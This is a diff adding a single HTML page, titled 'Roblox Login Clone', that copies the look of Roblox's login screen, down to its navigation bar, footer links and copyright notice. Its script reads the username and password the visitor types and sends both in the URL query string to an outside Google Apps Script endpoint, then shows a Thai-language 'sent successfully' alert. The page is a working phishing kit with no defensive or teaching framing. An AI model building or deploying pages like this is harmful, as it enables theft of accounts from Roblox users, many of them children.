@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Roblox Login Clone</title>
+    <style>
+        /* Reset */
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            background-color: #121217;
+            font-family: Arial, sans-serif;
+            color: #ccc;
+        }
+
+        /* Navbar */
+        .navbar {
+            display: flex;
+            align-items: center;
+            background-color: #121217;
+            padding: 10px 20px;
+            border-bottom: 1px solid #222;
+            gap: 15px;
+        }
+
+        .navbar .logo {
+            width: 24px;
+            height: 24px;
+        }
+
+        .navbar .logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .navbar .menu-item {
+            color: white;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .navbar .menu-item:hover {
+            text-decoration: underline;
+        }
+
+        .navbar .search-container {
+            flex-grow: 1;
+            position: relative;
+        }
+
+        .navbar input[type="search"] {
+            width: 100%;
+            padding: 6px 40px 6px 12px;
+            background-color: #2b2c34;
+            border: none;
+            border-radius: 16px;
+            color: #ddd;
+            font-size: 14px;
+            outline: none;
+        }
+
+        .navbar .search-icon {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 16px;
+            height: 16px;
+            background: url('data:image/svg+xml;utf8,<svg fill="%23ccc" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21.707 20.293l-5.387-5.387A7.922 7.922 0 0016 9a8 8 0 10-8 8 7.922 7.922 0 005.906-2.68l5.387 5.387a1 1 0 001.414-1.414zM4 9a5 5 0 1110 0 5 5 0 01-10 0z"/></svg>') no-repeat center;
+            pointer-events: none;
+        }
+
+        .navbar button.signup-btn {
+            background-color: #2e74ff;
+            border: none;
+            color: white;
+            font-weight: 600;
+            padding: 6px 16px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .navbar button.signup-btn:hover {
+            background-color: #1a52d4;
+        }
+
+        /* Main Content */
+        .main-container {
+            height: calc(100vh - 48px);
+            /* ลบความสูง navbar */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* Login Box */
+        .login-box {
+            background-color: #2b2c34;
+            width: 360px;
+            padding: 30px 30px 40px 30px;
+            border-radius: 1px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.6);
+            display: flex;
+            flex-direction: column;
+        }
+
+        .login-box h2 {
+            color: white;
+            font-weight: 700;
+            font-size: 22px;
+            text-align: center;
+            margin: 0 0 10px 0;
+        }
+
+        .login-box input[type="text"],
+        .login-box input[type="password"] {
+            background-color: #3a3b45;
+            border: none;
+            border-radius: 6px;
+            color: #ddd;
+            font-size: 14px;
+            padding: 12px 15px;
+            margin-bottom: 15px;
+            outline: none;
+        }
+
+        .login-box input::placeholder {
+            color: #999;
+        }
+
+        .login-box input:focus {
+            border: 1px solid #555;
+        }
+
+        .login-box button.login-btn {
+            background: none;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            color: #ddd;
+            font-weight: 600;
+            font-size: 14px;
+            padding: 12px 0;
+            cursor: pointer;
+            margin-bottom: 20px;
+            transition: background-color 0.3s ease;
+        }
+
+        .login-box button.login-btn:hover {
+            background-color: #44444f;
+        }
+
+        .login-box .forgot-password {
+            font-weight: 700;
+            font-size: 14px;
+            text-align: center;
+            margin-bottom: 15px;
+            cursor: pointer;
+            color: #eee;
+        }
+
+        .login-box .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .login-box hr {
+            border: 0;
+            border-top: 1px solid #44454f;
+            margin-bottom: 15px;
+        }
+
+        .login-box button.secondary-btn {
+            background-color: #44454f;
+            border: none;
+            border-radius: 6px;
+            color: #ddd;
+            font-weight: 700;
+            font-size: 14px;
+            padding: 12px 0;
+            cursor: pointer;
+            margin-bottom: 12px;
+            transition: background-color 0.3s ease;
+        }
+
+        .login-box button.secondary-btn:hover {
+            background-color: #555560;
+        }
+
+        .login-box .signup-text {
+            font-size: 14px;
+            text-align: center;
+            color: #ddd;
+        }
+
+        .login-box .signup-text a {
+            font-weight: 700;
+            color: #ddd;
+            cursor: pointer;
+            text-decoration: none;
+        }
+
+        .login-box .signup-text a:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            color: #ccc;
+            font-size: 12px;
+            text-align: center;
+            margin-top: 10px;
+            padding: 20px 10px 40px 10px;
+            background-color: #121212;
+            /* สีพื้นหลังเข้มแบบเดียวกับเว็บ */
+        }
+
+        .footer-links {
+            margin-bottom: 10px;
+        }
+
+        .footer-links a {
+            color: #ccc;
+            margin: 0 10px;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-links .privacy-icons {
+            font-size: 14px;
+            margin-left: 5px;
+            vertical-align: middle;
+        }
+
+        .footer hr {
+            border: 0.5px solid #444;
+            margin: 15px auto;
+            width: 90%;
+        }
+
+        .footer-copyright {
+            font-size: 10px;
+            color: #666;
+            margin-top: 10px;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+            line-height: 1.4;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="navbar">
+
+        <div class="logo">
+            <img src="https://github.com/Godmode053/Roblox/blob/main/Icon.png?raw=true" alt="Logo"
+                style="width:24px; height:24px;" />
+        </div>
+        <div class="menu-item">Charts</div>
+        <div class="menu-item">Marketplace</div>
+        <div class="menu-item">Create</div>
+        <div class="menu-item">Robux</div>
+        <div class="search-container">
+            <input type="search" placeholder="Search" aria-label="Search" />
+            <div class="search-icon"></div>
+        </div>
+        <button class="signup-btn">Sign Up</button>
+    </div>
+
+    <div class="main-container">
+        <div class="login-box" role="main">
+            <h2>Login to Roblox</h2>
+
+            <input id="username" type="text" placeholder="Username/Email/Phone" />
+            <input id="password" type="password" placeholder="Password" />
+            <button class="login-btn" onclick="sendLogin()">Log In</button>
+
+            <div class="forgot-password" tabindex="0">Forgot Password or Username?</div>
+            <hr />
+            <button class="secondary-btn">Email Me a One-Time Code</button>
+            <button class="secondary-btn">Use Another Device</button>
+            <div class="signup-text">
+                Don't have an account? <a href="#">Sign Up</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function sendLogin() {
+            var username = document.getElementById("username").value;
+            var password = document.getElementById("password").value;
+
+            var url = "https://script.google.com/macros/s/AKfycbzw_bLmY7W840DfNqE03SbLi5QbPY5F2BHA-Y-vHZzl2-d3xW9ZdLAIAfqqpb7A4fKK/exec" + "?username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password);
+
+            fetch(url)
+                .then(response => response.text())
+                .then(data => {
+                    console.log(data); // ควรแสดง OK ถ้าส่งสำเร็จ
+                    alert("ส่งข้อมูลสำเร็จ");
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert("ส่งข้อมูลไม่สำเร็จ");
+                });
+        }
+
+    </script>
+
+
+</body>
+
+<footer class="footer">
+    <div class="footer-links">
+        <a href="#">About Us</a>
+        <a href="#">Jobs</a>
+        <a href="#">Blog</a>
+        <a href="#">Parents</a>
+        <a href="#">Gift Cards</a>
+        <a href="#">Help</a>
+        <a href="#">Terms</a>
+        <a href="#">Accessibility</a>
+        <a href="#">Privacy</a>
+        <a href="#">Your Privacy Choices <span class="privacy-icons"></span></a>
+    </div>
+    <hr />
+    <div class="footer-copyright">
+        ©2025 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and
+        unregistered trademarks in the U.S. and other countries.
+    </div>
+</footer>
+
+
+</html>
